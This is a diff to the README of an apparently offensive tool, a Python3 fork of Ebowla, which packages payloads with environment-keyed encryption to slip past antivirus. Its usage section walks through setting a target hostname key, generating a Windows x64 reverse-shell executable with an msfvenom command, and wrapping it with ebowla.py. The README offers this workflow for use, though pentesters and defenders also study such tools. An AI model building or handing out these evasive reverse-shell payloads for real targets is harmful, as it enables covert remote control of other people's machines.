@@ -1,29 +1,31 @@
 # 3 B O W L A
 ## Ebowla Fork to add Python3 Support
-### project is currently ongoing, so obviously not everything works (honestly nothing really works)
+### we are in the very beginning here - so not everything works.
 
-buuuuuut if the output type is set to GO in the generic config, all compatible payload types will work (we think... maybe). What follows here definitely works and the other functionalities will follow asap. Cheers!
+When using go as payload type, most of the functionality should be implemeted and function properly. We decided against rewriting the functionality needed to use python as payload type, as cross compiling python executables on linux only really works through the usage of pyinstaller in wine - which is quite a hassle and an ugly solution, especially considering that GO as payload type can almost take over everything that python could and we, ourselves, never had to use python for it. 
 
-## How to use it (if you don't know how to use Ebowla yet)
+## How to use Ebowla
+
+This part is taken from a writeup I did for Ebowla with python2. With the added python3 support, none of the steps following change, at least not for the output type EXE. If we have time, we will provide documentation adjusted to python3 and other functionality. 
 
 ### edit generic.config:
 
 change:
 
-output_type = GO
+payload_type = GO
 
-payload_type = EXE
+output_type = EXE
 
 Set at least one environment variable (computername = hostname),
 the name has to be exact, as Ebowla won't decrypt otherwise.
 
-### make payload
+### creating payload
 
-Make, as an example, a reverse shell payload with metersploit: 
+Here used as an example, a reverse shell made with mfsvenom:
 
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```
 
-### build executable with Ebowla
+### building executable with Ebowla
 
 ```python3 ebowla.py shell.exe genetic.config```
 
